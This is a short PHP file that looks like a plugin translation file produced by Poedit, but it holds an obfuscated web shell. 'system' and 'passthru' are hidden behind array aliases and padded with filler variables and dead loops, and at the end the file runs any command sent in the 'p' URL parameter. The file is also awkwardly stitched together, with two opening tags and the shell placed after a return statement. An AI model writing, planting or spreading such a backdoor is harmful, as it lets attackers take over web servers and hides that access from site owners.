<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=(n != 1);','messages'=>['This is a dummy plugin'=>'Este es un plugin dummy'],'language'=>'de_DE','x-generator'=>'Poedit 2.4.1'];
$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>